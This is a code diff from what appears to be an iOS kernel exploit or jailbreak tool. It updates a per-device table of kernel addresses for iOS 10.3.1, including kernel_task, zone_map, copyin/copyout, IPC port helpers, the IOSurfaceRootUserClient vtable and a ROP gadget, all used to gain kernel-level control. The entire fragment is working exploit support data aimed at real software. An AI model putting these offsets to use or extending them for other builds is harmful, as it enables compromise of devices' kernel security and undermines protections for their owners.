@@ -135,21 +135,24 @@ BOOL init_symbols()
         OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff0075ec0b0;
     }
     //SE 10.3.1 //TODO: CLEAN UP OFFSETS AND ADD UPDATED EXPLOIT
-    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_S5L8960X") == 0) {
-        OFFSET_ZONE_MAP                        =0xfffffff00754c478;
-        OFFSET_KERNEL_MAP                      =0xfffffff0075a8050;
-        OFFSET_KERNEL_TASK                     =0xfffffff0075a8048;
-        OFFSET_REALHOST                        =0xfffffff00752eba0;
-        OFFSET_BZERO                           =0xfffffff007081f80;
-        OFFSET_BCOPY                           =0xfffffff007081dc0;
-        OFFSET_COPYIN                          =0xfffffff007181218;
-        OFFSET_COPYOUT                         =0xfffffff00718140c;
-        OFFSET_ROOT_MOUNT_V_NODE               =0xfffffff0075a80b0;
-        OFFSET_IPC_PORT_ALLOC_SPECIAL          =0xfffffff007099f7c;
-        OFFSET_IPC_KOBJECT_SET                 =0xfffffff0070ad1d4;
-        OFFSET_IPC_PORT_MAKE_SEND              =0xfffffff007099aa0;
-        OFFSET_IOSURFACEROOTUSERCLIENT_VTAB    =0xfffffff006f25538;
-        OFFSET_ROP_ADD_X0_X0_0x10              =0xfffffff006525174;
+       else if (strcmp(u.machine, "iPhone8,4") == 0 || strcmp(u.machine, "iPhone8,5") == 0) {
+        if ([ver  isEqual: @"Version 10.3.1 (Build 14E304)"])
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007548478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075a4050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075a4048;
+            OFFSET_REALHOST                             = 0xfffffff00752aba0;
+            OFFSET_BZERO                                = 0xfffffff007081f80;
+            OFFSET_BCOPY                                = 0xfffffff007081dc0;
+            OFFSET_COPYIN                               = 0xfffffff007180720;
+            OFFSET_COPYOUT                              = 0xfffffff007180914;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099efc;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad154;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff007099a20;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e83af8;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff006481174;
+            OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff0075a40b0;
+        }
     }
     //6s 10.3.1
     else if (strcmp(u.machine, "iPhone8,1") == 0 || strcmp(u.machine, "iPhone8,2") == 0) {
